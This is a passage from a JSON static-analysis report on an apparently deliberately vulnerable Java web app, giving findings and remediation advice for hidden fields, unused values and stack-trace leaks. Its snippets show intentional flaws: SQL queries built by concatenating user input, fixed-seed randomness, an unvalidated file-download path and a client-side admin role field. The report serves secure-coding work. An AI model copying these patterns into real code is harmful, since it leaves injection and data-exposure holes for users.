"WebContent/WEB-INF/jspViews/addEmployee.jsp", "items": [{"id": "IN00128", "function": "null()", "line": "22", "snippet": "<form:form action=\"storeEmployee.html\" method=\"post\" modelAttribute=\"employeeBean\">\n<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n<table align=\"center\">\n        <tr>"}]}, {"file": "WebContent/WEB-INF/jspViews/listStudentGradeJSON.jsp", "items": [{"id": "IN00129", "function": "null()", "line": "34", "snippet": "<br>\n\t</div>\n\t<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n\t<a href=\"listStudentGradeJSON.html\">Get JSON Response</a> <br>\n\t<p id=\"demo\"></p>"}]}, {"file": "WebContent/WEB-INF/jspViews/searchListEmployee.jsp", "items": [{"id": "IN00130", "function": "null()", "line": "16", "snippet": "<form:form action=\"searchEmployee.html\" method=\"post\" modelAttribute=\"employeeSearchBean\">\n<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n<table>\n        <tr>"}]}, {"file": "WebContent/WEB-INF/jspViews/uploadFile.jsp", "items": [{"id": "IN00131", "function": "null()", "line": "46", "snippet": "<form id=\"downloadPropFileForm\" action=\"downloadPropFile.html\" method=\"POST\">\n<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n     <p><button type=\"submit\" class=\"btn\">Download prop</button></p>       \n</form>"}]}, {"file": "WebContent/WEB-INF/jspViews/addUser.jsp", "items": [{"id": "IN00132", "function": "null()", "line": "22", "snippet": "<form:form action=\"storeUser.html\" method=\"post\" modelAttribute=\"userAccountBean\">\n<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n<table align=\"center\">\n        <tr>"}]}, {"file": "WebContent/WEB-INF/jspViews/uploadFile.jsp", "items": [{"id": "IN00133", "function": "null()", "line": "26", "snippet": "<!--alert(${_csrf.token}); alert(${_csrf.parameterName});-->\n<form id=\"fileuploadForm\" action=\"fileupload.html\" method=\"POST\" enctype=\"multipart/form-data\">\n\t<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n    <label for=\"file\">File</label>\n    <input id=\"file\" type=\"file\" name=\"file\" />"}]}, {"file": "WebContent/WEB-INF/jspViews/uploadFile.jsp", "items": [{"id": "IN00134", "function": "null()", "line": "40", "snippet": "<form id=\"downloadForm\" action=\"download.html?param1=file\" method=\"GET\">\n\t<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n    <input id=\"file\" type=\"text\" name=\"file\" />\n    <p><button type=\"submit\" class=\"btn\">Download</button></p>"}]}, {"file": "WebContent/WEB-INF/jspViews/ldapFilter.jsp", "items": [{"id": "IN00135", "function": "null()", "line": "24", "snippet": "<form id=\"ldapFilterForm\" action=\"ldapFilter.html\" method=\"POST\">\n\t<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n    <input id=\"user\" type=\"text\" name=\"user\" />\n    <input id=\"pass\" type=\"text\" name=\"pass\" />"}]}, {"file": "WebContent/WEB-INF/jspViews/login.jsp", "items": [{"id": "IN00136", "function": "null()", "line": "15", "snippet": "<h1 align=\"center\">Login to Employee Secure App</h1>\n<form action=\"validate.html\" method=\"post\">\n<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n<table align=\"center\">\n\t\t<tr style=\"color:red\"><center>${msg}</center></tr>"}]}], "remediation": {"remediation": {"@id": "R.0007", "@name": "Hidden Field", "@dateLastModified": "1/11/2021", "faqs": {"faq": {"question": "What if I encode with BASE64 the information on the hidden field?", "answer": "There are automated tools (e.g. ZAP, fiddler, BurpSuite, etc.) that will detect all hidden fields and search for sensitive information there, even if the information is encoded."}}, "recommendations": {"recommendation": [{"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">uploadFile.jsp</em>\n\n&lt;form id=&quot;uploademployeeForm&quot; action=&quot;uploademployee.html&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;\n\t<em class=\"red\">&lt;input type=&quot;hidden&quot; name=&quot;${_csrf.parameterName}&quot; value=&quot;${_csrf.token}&quot; /&gt;</em>\n    &lt;label for=&quot;file&quot;&gt;File&lt;/label&gt;\n    &lt;input id=&quot;file&quot; type=&quot;file&quot; name=&quot;file&quot; /&gt;\n<em class=\"red\">&lt;input type=&quot;hidden&quot; name=&quot;userRole&quot; value=&quot;admin&quot; /&gt;</em>\n    &lt;p&gt;&lt;button type=&quot;submit&quot; class=&quot;btn&quot;&gt;Upload Employee Detail&lt;/button&gt;&lt;/p&gt;        \n&lt;/form&gt;", "nonvulncode": "<em class=\"bold\">uploadFile.jsp</em>\n\n&lt;form id=&quot;uploademployeeForm&quot; action=&quot;uploademployee.html&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;\n\t<em class=\"blue\">&lt;input type=&quot;hidden&quot; name=&quot;${_csrf.parameterName}&quot; value=&quot;${_csrf.token}&quot; /&gt;</em>\n    &lt;label for=&quot;file&quot;&gt;File&lt;/label&gt;\n    &lt;input id=&quot;file&quot; type=&quot;file&quot; name=&quot;file&quot; /&gt;\n<em class=\"blue\">//hidden field removed</em>\n    &lt;p&gt;&lt;button type=&quot;submit&quot; class=&quot;btn&quot;&gt;Upload Employee Detail&lt;/button&gt;&lt;/p&gt;        \n&lt;/form&gt;", "comments": "An attacker can read or change any information in the forms, including hidden fields. scripts running on the page can also access the hidden fields, and the information is stored in the computer, making it accessible by other users.\n\nTo protect attackers from reading sensitive information from the users, it is recommended to remove sensitive hidden variables from client side. Instead use server variables like session objects, viewstate, etc.\n\nThere's nothing wrong on using hiddent field to store information that is not sensitive (e.g., session ID, CSRF token) but if the information stored in hidden field is senstive don't use it,  this will allow attacker to exploit it.", "impact": "The objects that are handling the information stored on the client-side hiden fields must be changed to retrieve the same  information from the server-side stored session.", "abstract": "Removal of sensitive hidden field"}, {"@type": ".NET/C#/ASP", "vulncode": "&lt;div id=&quot;formContent&quot;&gt;\n            @using (Html.BeginForm(&quot;Login&quot;, &quot;Home&quot;, new { ReturnUrl = Request.QueryString[&quot;ReturnUrl&quot;] },FormMethod.Get))\n            {\n               \n                &lt;div class=&quot;fadeIn first&quot;&gt;\n                    &lt;h4&gt;Login &lt;/h4&gt;\n                   ..\n                &lt;/div&gt;\n\n                &lt;input type=&quot;text&quot; id=&quot;Username&quot; class=&quot;fadeIn second&quot; name=&quot;Username&quot; placeholder=&quot;Username&quot;&gt;\n                &lt;input type=&quot;password&quot; id=&quot;Password&quot; class=&quot;fadeIn third&quot; name=&quot;Password&quot; placeholder=&quot;Password&quot;&gt;\n                &lt;input type=&quot;submit&quot; class=&quot;fadeIn fourth&quot; value=&quot;Log In&quot;&gt;\n               <em class=\"red\"> &lt;input type=&quot;hidden&quot; name=&quot;userRole&quot; value=&quot;admin&quot; /&gt;</em>\n            }\n            &lt;div id=&quot;formFooter&quot;&gt;\n                &lt;label class=&quot;text-danger&quot;&gt;@TempData[&quot;errmsg&quot;]&lt;/label&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;", "nonvulncode": "&lt;div id=&quot;formContent&quot;&gt;\n            @using (Html.BeginForm(&quot;Login&quot;, &quot;Home&quot;, new { ReturnUrl = Request.QueryString[&quot;ReturnUrl&quot;] },FormMethod.Get))\n            {\n               \n                &lt;div class=&quot;fadeIn first&quot;&gt;\n                    &lt;h4&gt;Login &lt;/h4&gt;\n                   ..\n                &lt;/div&gt;\n\n                &lt;input type=&quot;text&quot; id=&quot;Username&quot; class=&quot;fadeIn second&quot; name=&quot;Username&quot; placeholder=&quot;Username&quot;&gt;\n                &lt;input type=&quot;password&quot; id=&quot;Password&quot; class=&quot;fadeIn third&quot; name=&quot;Password&quot; placeholder=&quot;Password&quot;&gt;\n                &lt;input type=&quot;submit&quot; class=&quot;fadeIn fourth&quot; value=&quot;Log In&quot;&gt;\n              <em class=\"blue\"> //hidden field removed</em>\n            }\n            &lt;div id=&quot;formFooter&quot;&gt;\n                &lt;label class=&quot;text-danger&quot;&gt;@TempData[&quot;errmsg&quot;]&lt;/label&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;", "comments": "An attacker can read or change any information in the forms, including hidden fields. scripts running on the page can also access the hidden fields, and the information is stored in the computer, making it accessible by other users.\n\nTo protect attackers from reading sensitive information from the users, it is recommended to remove sensitive hidden variables from client side. Instead use server variables like session objects, viewstate, etc.\n\nThere's nothing wrong on using hiddent field to store information that is not sensitive (e.g., session ID, CSRF token) but if the information stored in hidden field is senstive don't use it,  this will allow attacker to exploit it.", "impact": "The objects that are handling the information stored on the client-side hiden fields must be changed to retrieve the same  information from the server-side stored session.", "abstract": "Removal of sensitive hidden field"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Poor Style: Value Never Read": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00161", "function": "VariableAccess: ds", "line": "208", "snippet": "Context initContext = new InitialContext();\n\t\t\tContext envContext = (Context) initContext.lookup(\"java:comp/env\");\n\t\t\tDataSource ds = (DataSource) envContext.lookup(\"jdbc/UsersDB\");\n\n\t\t\tif (datasource != null) {"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00162", "function": "VariableAccess: i", "line": "370", "snippet": "Random r = new Random();\n\t        r.setSeed(12345);\n\t        int i = r.nextInt();\n\t        byte[] b = new byte[4];\n\t        r.nextBytes(b);"}]}, {"file": "src/com/accenture/sec/controller/StudentController.java", "items": [{"id": "IN00163", "function": "VariableAccess: loggedinUser", "line": "78", "snippet": "userRole=cookie.getValue();\n\t\t      if (\"userName\".equals(cookie.getName()))\n\t\t    \t  loggedinUser=cookie.getValue();\n\t\t    }\n\t\t\t/*"}]}, {"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00164", "function": "VariableAccess: departmentMap", "line": "62", "snippet": "final EmployeeDAOImpl clone = (EmployeeDAOImpl) super.clone();\n\t\ttry {\n\t\t\tdepartmentMap =  getDepartmentMap();\n\t\t} catch (Exception e) {\n\t\t\tlogger.debug(\"Error in cloning\");"}]}, {"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00165", "function": "VariableAccess: isCondCheck", "line": "151", "snippet": "if(optSearch.isPresent() && employeeSearch.getEmpName()!=null && !employeeSearch.getEmpName().isEmpty()) {\n\t\t\tisCondCheck = true;\n\t\t\thql =\"SELECT empId,empName,city,gender,salary from EmployeeEntity where empName like '%\" +employeeSearch.getEmpName() + \"%'\";\n\t\t\thql2 =\"SELECT empId,empName,city,gender,salary from EmployeeEntity where empName like '%\" +employeeSearch.getEmpName() + \"%'\";"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00166", "function": "VariableAccess: r", "line": "521", "snippet": "KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(\"RSA\", \"BC\");\n\t\t\tSecureRandom secRandom = new SecureRandom();\n\t\t\tRandom r = new Random();\n\t\t    keyPairGenerator.initialize(secRandom.nextInt(1500));\n\t\t    keyPairGenerator.initialize(1024, secRandom);"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00167", "function": "VariableAccess: pwdBytes", "line": "261", "snippet": "byte[] pwdBytes;\n\t\t      if ((password instanceof byte[])) {\n\t\t          pwdBytes = (byte[])password;\n\t\t        }"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00168", "function": "VariableAccess: em", "line": "107", "snippet": "public String validateLogin(LoginBean loginBean){\n\t\t\n\t\tEntityManager em=entityManagerFactory.createEntityManager();\n\t\tConnection conn = null;\n\t\tString uName = loginBean.getUserName();"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00169", "function": "VariableAccess: insertSql", "line": "126", "snippet": "//String sql = \"select * from Account where userName='\"+uName+\"' and Password='\"+password+\"'\";\n\t\t\tString insertSql = \"Insert into Account set userName='\"+uName+\"' and Password='\"+password+\"'\";\n\n\t\t\ttry (InputStream input = LoginDAO.class.getResourceAsStream(\"/com/accenture/sec/resources/sec_conn.properties\")) {"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00170", "function": "VariableAccess: httpResponseR", "line": "1156", "snippet": "if(urlR!=null) {\n\t\tHttpGet httpGetR = new HttpGet(urlR);\n\t\tCloseableHttpResponse httpResponseR = httpClient.execute(httpGetR);\n\t\t}"}]}, {"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00171", "function": "VariableAccess: whereCond", "line": "143", "snippet": "EntityManager em=entityManagerFactory.createEntityManager();\n\t\t\n\t\tStringBuilder whereCond = new StringBuilder();\n\t\tString hql= null;\n\t\tString hql2 = null;"}]}, {"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00172", "function": "VariableAccess: res2", "line": "168", "snippet": "}*/\n\t\tList<Object[]> res  =  query.getResultList();\n\t\tList<Object[]> res2  =  query2.getResultList();\n\t\t\n\t\tIterator it = res.iterator();"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00173", "function": "VariableAccess: dbuser", "line": "198", "snippet": "String dbURL = prop.getProperty(\"sec_db_url\");\n\t\t\tString dbuser = prop.getProperty(\"sec_user\");\n\t\t\tString dbpwd = prop.getProperty(\"sec_password\");\n\t\t\tpassword.append(prop.getProperty(\"sec_password\"));"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00174", "function": "VariableAccess: pattern", "line": "1187", "snippet": "//ssrf\n\tpublic String validateTesterInWebphone(String attuid) {\n\t    String pattern = \"[a-zA-Z0-9]{6}\";\n\t    RestTemplate restTemplate = new RestTemplate();\n\t\t/*"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00175", "function": "VariableAccess: trustCertificate", "line": "125", "snippet": "public X509Certificate[] getAcceptedIssuers() {\n        \ttry {\n        \tX509Certificate [] trustCertificate = new X509Certificate [0]; \n        \tTrustManagerFactory tmf = TrustManagerFactory .getInstance(TrustManagerFactory.getDefaultAlgorithm()); \n        \ttmf.init((KeyStore) null);"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00176", "function": "VariableAccess: decrypted", "line": "403", "snippet": "ecipher.init(Cipher.DECRYPT_MODE, key, new PBEParameterSpec(new byte[16], 50));\n            byte[] decrptByte=ecipher.doFinal(Base64.getDecoder().decode(encrypted));            \n            String decrypted = new String(decrptByte); \n                        \n\t\t} catch (NoSuchAlgorithmException e) {"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00177", "function": "VariableAccess: data", "line": "973", "snippet": "DocumentBuilder builder;\n        Document doc = null;\n        String data=null;\n        Node node = null;\n        String rootPath = System.getProperty(\"catalina.home\")+File.separator+\"tmpFiles\"+File.separator+\"EmployeeFeedVul.xml\";"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00178", "function": "VariableAccess: result", "line": "1117", "snippet": "//NamingEnumeration enumList=ctx.list(\"ou=People\");\n\t\t\t\t//NamingEnumeration<SearchResult> results = ctx.search(base, filter, new String[]{user}, new SearchControls());\n\t\t\t\tresult= results.hasMore();\n\t\t\t} \n\t\t\tctx.close();"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00179", "function": "VariableAccess: identifier", "line": "373", "snippet": "byte[] b = new byte[4];\n\t        r.nextBytes(b);\n\t        String identifier = seed.toString()+\"USER\";\n\t        \n\t\t\t/*"}]}, {"file": "src/com/accenture/sec/controller/StudentController.java", "items": [{"id": "IN00180", "function": "VariableAccess: userRole", "line": "76", "snippet": "Cookie cookie = cookies[i];\n\t\t      if (\"userRole\".equals(cookie.getName()))\n\t\t    \t  userRole=cookie.getValue();\n\t\t      if (\"userName\".equals(cookie.getName()))\n\t\t    \t  loggedinUser=cookie.getValue();"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00181", "function": "VariableAccess: dbURL", "line": "197", "snippet": "prop.load(input);\n\t\t\t\n\t\t\tString dbURL = prop.getProperty(\"sec_db_url\");\n\t\t\tString dbuser = prop.getProperty(\"sec_user\");\n\t\t\tString dbpwd = prop.getProperty(\"sec_password\");"}]}, {"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00182", "function": "VariableAccess: res2", "line": "121", "snippet": "List<Object[]> res  =  query.getResultList();\n\t\tList<Object[]> res2  =  query2.getResultList();\t\n\t\t\n\t\tIterator it = res.iterator();"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00183", "function": "VariableAccess: escapedVal", "line": "255", "snippet": "String escapedVal = StringEscapeUtils.escapeHtml4(userAccountBean.getUserName());\n\t\t\tescapedVal= StringEscapeUtils.escapeEcmaScript(escapedVal);\n\t\t\tescapedVal= HtmlUtils.htmlEscape(escapedVal);\n\t\t\tescapedVal = Encode.forHtmlAttribute(userAccountBean.getUserName());"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00184", "function": "VariableAccess: dbpwd", "line": "199", "snippet": "String dbURL = prop.getProperty(\"sec_db_url\");\n\t\t\tString dbuser = prop.getProperty(\"sec_user\");\n\t\t\tString dbpwd = prop.getProperty(\"sec_password\");\n\t\t\tpassword.append(prop.getProperty(\"sec_password\"));"}]}], "remediation": null}, "System Information Leak": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00185", "function": "printStackTrace()", "line": "329", "snippet": "} catch (SQLException e) {\n\t\t\t\te.printStackTrace();\n\t\t\t} catch (IOException e) {\n\t\t\t\te.printStackTrace();"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00186", "function": "printStackTrace()", "line": "176", "snippet": "e.printStackTrace();\n\t\t\t} catch (IOException e) {\n\t\t\t\te.printStackTrace();\n\t\t\t}"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00187", "function": "printStackTrace()", "line": "174", "snippet": "*/\n\t\t\t} catch (SQLException e) {\n\t\t\t\te.printStackTrace();\n\t\t\t} catch (IOException e) {\n\t\t\t\te.printStackTrace();"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00188", "function": "printStackTrace()", "line": "585", "snippet": "encryptedText = sb.toString();\n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\te.printStackTrace();\n\t\t}"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00189", "function": "printStackTrace()", "line": "451", "snippet": "mv.setViewName(\"failure\");\n\t        mv.addObject(\"msg\", \"Error in downloading property file, check log for more information\");\n\t        e.printStackTrace();\n\t    }\n\t\treturn mv;"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00190", "function": "printStackTrace()", "line": "478", "snippet": "} catch (UnsupportedEncodingException e) {\n\t\t\t// TODO Auto-generated catch block\n\t\t\te.printStackTrace();\n\t\t}"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00191", "function": "printStackTrace()", "line": "409", "snippet": "mv.setViewName(\"failure\");\n\t        mv.addObject(\"msg\", \"Error in downloading file, check log for more information\");\n\t        e.printStackTrace();\n\t    }\n\t\treturn mv;"}]}, {"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00192", "function": "printStackTrace()", "line": "39", "snippet": "} catch (SQLException e) {\n\t\t\t// TODO Auto-generated catch block\n\t\t\te.printStackTrace();\n\t\t} catch (Exception e) {\n\t\t\t// TODO Auto-generated catch block"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00193", "function": "printStackTrace()", "line": "1083", "snippet": "mv.setViewName(\"uploadFile\");\n\t\t} catch (XMLStreamException e) {\n\t\t    e.printStackTrace();\n\t\t} catch (IOException e) {\n\t\t    e.printStackTrace();"}]}, {"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00194", "function": "printStackTrace()", "line": "279", "snippet": "mailMessage = \"Error is sending email\";\n        } catch (IOException exception) {\n        \texception.printStackTrace();\n        \tmailMessage = \"Error is sending email\";\n        }"}]}, {"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00195", "function": "printStackTrace()", "line": "36", "snippet": "} catch (NamingException e) {\n\t\t\t// TODO Auto-generated catch block\n\t\t\te.printStackTrace();\n\t\t} catch (SQLException e) {\n\t\t\t// TODO Auto-generated catch block"}]}, {"file": "src/com/accenture/sec/controller/FormServlet.java", "items": [{"id": "IN00196", "function": "printStackTrace()", "line": "78", "snippet": "} catch (ServletException e) {\n\t\te.printStackTrace();\n\t} catch (IOException e) {\n\t\te.printStackTrace();"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00197", "function": "printStackTrace()", "line": "1085", "snippet": "e.printStackTrace();\n\t\t} catch (IOException e) {\n\t\t    e.printStackTrace();\n\t\t}"}]}, {"file": "src/com/accenture/sec/controller/FormServlet.java", "items": [{"id": "IN00198", "function": "printStackTrace()", "line": "80", "snippet": "e.printStackTrace();\n\t} catch (IOException e) {\n\t\te.printStackTrace();\n\t}\n    }"}]}, {"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00199", "function": "printStackTrace()", "line": "276", "snippet": "catch (MailException exception) {\n            exception.printStackTrace();\n            mailMessage = \"Error is sending email\";\n        } catch (IOException exception) {"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00200", "function": "printStackTrace()", "line": "331", "snippet": "e.printStackTrace();\n\t\t\t} catch (IOException e) {\n\t\t\t\te.printStackTrace();\n\t\t\t}"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00201", "function": "printStackTrace()", "line": "917", "snippet": "System.out.println(\"Sent message successfully....\");\n\t      } catch (MessagingException mex) {\n\t         mex.printStackTrace();\n\t      }"}]}, {"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00202", "function": "printStackTrace()", "line": "42", "snippet": "} catch (Exception e) {\n\t\t\t// TODO Auto-generated catch block\n\t\t\te.printStackTrace();\n\t\t}\n\t\treturn empImp;"}]}], "remediation": {"remediation": {"@id": "R.0063", "@name": "System Information Leak", "@dateLastModified": "11/20/2020", "faqs": {"faq": {"question": "What can a attacker do with the stack trace information? There is no PII there!", "answer": "The attacker can get many information about the system with the stack traced, including the OS, Web Server, Language network properties, modules and framework in use. With this information the attacker can exploit known vulnerabilities in any of those if they exist."}}, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public ActionResult IPChecker(string txtIP)\n        {\n            using (Process process = new Process())\n            {\n                try\n                {\n                    IPAddress ip = null;\n                    if (IPAddress.TryParse(txtIP.ToString(), out ip)){\n                        Ping png = new Ping();\n                        PingReply rep = png.Send(ip);\n                        ViewData[&quot;PingResponse&quot;] = &quot;Ping to &quot; + WebUtility.HtmlEncode(txtIP.ToString()) + &quot;[&quot; + rep.Address.ToString() + &quot;]&quot; + &quot; Successful&quot; +\n                                                   &quot; Response delay = &quot; + rep.RoundtripTime.ToString() + &quot; ms&quot;;\n                    }\n                    else\n                    {\n                        ViewData[&quot;PingResponse&quot;] = &quot;Invalid IP [&quot; + WebUtility.HtmlEncode(txtIP.ToString()) + &quot;]&quot;;\n                    }\n                }\n                catch (ArgumentException adEx)\n                {\n                    ViewData[&quot;ErrorMessage&quot;] = adEx.Message.ToString();\n                   <em class=\"red\"> Console.WriteLine(&quot;ArgumentException was thrown.&quot; + adEx.StackTrace );</em>\n                }\n                catch (Exception ex)\n                {\n                    ViewData[&quot;PingResponse&quot;] = ex.Message;\n                    <em class=\"red\">Console.WriteLine(&quot;An Exception was thrown.&quot; + ex.StackTrace);</em>\n                }\n            }\n            return View();\n        }", "nonvulncode": "public ActionResult IPChecker(string txtIP)\n        {\n            using (Process process = new Process())\n            {\n                try\n                {\n                    IPAddress ip = null;\n                    if (IPAddress.TryParse(txtIP.ToString(), out ip)){\n                        Ping png = new Ping();\n                        PingReply rep = png.Send(ip);\n                        ViewData[&quot;PingResponse&quot;] = &quot;Ping to &quot; + WebUtility.HtmlEncode(txtIP.ToString()) + &quot;[&quot; + rep.Address.ToString() + &quot;]&quot; + &quot; Successful&quot; +\n                                                   &quot; Response delay = &quot; + rep.RoundtripTime.ToString() + &quot; ms&quot;;\n                    }\n                    else\n                    {\n                        ViewData[&quot;PingResponse&quot;] = &quot;Invalid IP [&quot; + WebUtility.HtmlEncode(txtIP.ToString()) + &quot;]&quot;;\n                    }\n                }\n                catch (ArgumentException adEx)\n                {\n                    TempData[&quot;errmsg&quot;] = adEx.Message.ToString();\n                    <em class=\"blue\">logger.Error(&quot;ArgumentException encountered: &quot; + adEx.Message);\n                }\n                catch (Exception ex)\n                {\n                    TempData[&quot;errmsg&quot;] = ex.Message;\n             </em>       <em class=\"blue\">logger.Error(&quot;Exception encountered: &quot; + ex.Message);\n                }\n            }\n            return View();\n        }</em>", "comments": "Sensitive information must not be logged (including the stack trace use) because they may expose detailed information about the system.  \nRemove any message that contain system information from the logs (e.g. stack trace). Prefer to use a business message when required, and disable any system message used for troubleshooting when deploying to production.\nTo the user, instead of displaying the exception message, display a generic, human-readable message (&quot;An error occurred, please try again. If you need to contact support, reference case number 36313.&quot;). Avoid providing information that is useful to attackers. \n\nOn the internal part, in the Server-side, log the error message, the stack trace and any pointer to the data used and associate it with the case number, so the support team can debug the code without having direct access to any PII. \nStoring information in the logger must still contain information that is useful to the application production team for troubleshooting. \nIf required to log stack trace for debugging/troubleshooting, this log file has to be protected and it's access controlled (need to know basis).\n\nfor more information, see: https://www.loggly.com/blog/30-best-practices-logging-scale/ and \nhttps://michaelscodingspot.com/logging-in-dotnet/ \n\nNote:\n*Any message printed or stored will be detected as &quot;System Information Leak (Internal or External)&quot;. Messages need to be checked to make sure no system information is printed (e.g. replace the stack trace to the exception message, as it gives less system information to an attacker).\n**It is recommended to use a logger instead of Console.write. This will not remove the alerts from SAST tools. System information leak can be avoided to an extent by replacing StackTrace (.Net) or printstacktrace(JAVA) with logger. But even with logger, we need to be avoid logging sensitive information.\n*** SAST tools will always log this as an issue once it sees the StackTrace. SAST tools will always detect an issue if you are using any method coming from the exception object even if there is no sensitive information being included in the logged.", "impact": "*****From System Information Leak Internal*****:\nNo impact for the code performance.\n\nNeed to notify the monitoring / SIEM teams about any change on the logs fields / format. This may impact the correlation rules.\n\nOld logs that contain PII information must be properly secure. Depending to the access level, the application team must open an incident to the SOC to respond and investigate if data was leaked internally.\n\n*****From System Information Leak Externa*****l:\nIf it does not exist yet, a generic error page needs to be created and approved by marketing / UI designers.", "abstract": "Use of logger"}, {"@type": "JAVA/JSP", "vulncode": "public void downloadFile( @RequestParam(value=&quot;file&quot;)String name,HttpSession session,HttpServletResponse response) throws Exception {\n\t    try {\n\t        String filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\&quot;;\n\t        String fileName = filePath + name;\n\t        File fileToDownload = new File(fileName);\n\t        InputStream inputStream = new FileInputStream(fileToDownload);\n\t        response.setContentType(&quot;application/force-download&quot;);\n\t        response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=&quot;+fileName+&quot;.txt&quot;);\n\t        IOUtils.copy(inputStream, response.getOutputStream());\n\t        response.flushBuffer();\n\t        inputStream.close();\n\t    } catch (Exception e){\t \n\t       <em class=\"red\"> e.printStackTrace(); // Stacktrace might reveal sensitive file path information to console</em>\n\t    }\n\n\t}", "nonvulncode": "EmployeeController c<em class=\"bold\">lass</em>\n<em class=\"blue\">private static final Logger logger = LoggerFactory.getLogger(EmployeeController.class);</em>\npublic void downloadFile( @RequestParam(value=&quot;file&quot;)String name,HttpSession session,HttpServletResponse response) throws Exception {\n\t    try {\n\t        String filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\&quot;;\n\t        String fileName = filePath + name;\n\t        File fileToDownload = new File(fileName);\n\t        InputStream inputStream = new FileInputStream(fileToDownload);\n\t        response.setContentType(&quot;application/force-download&quot;);\n\t        response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=&quot;+fileName+&quot;.txt&quot;);\n\t        IOUtils.copy(inputStream, response.getOutputStream());\n\t        response.flushBuffer();\n\t        inputStream.close();\n\t    } catch (Exception e){\t \n\t    \t<em class=\"blue\">logger.error(&quot;Error in executing command, contact support team, case number 36313&quot;);</em>\n\t    \tModelAndView mv = new ModelAndView();\n\t\t\tmv.setViewName(&quot;failure&quot;);\n\t        mv.addObject(&quot;msg&quot;, &quot;Error in executing command, check log for more information&quot;);\n\t    }\n\n\t}", "comments": "Sensitive information must not be logged (including the stack trace use) because they may expose detailed information about the system.  \nRemove any message that contain system information from the logs (e.g. stack trace). Prefer to use a business message when required, and disable any system message used for troubleshooting when deploying to production.\nTo the user, instead of displaying the exception message, display a generic, human-readable message (&quot;An error occurred, please try again. If you need to contact support, reference case number 36313.&quot;). Avoid providing information that is useful to attackers. \n\nOn the internal part, in the Server-side, log the error message, the stack trace and any pointer to the data used and associate it with 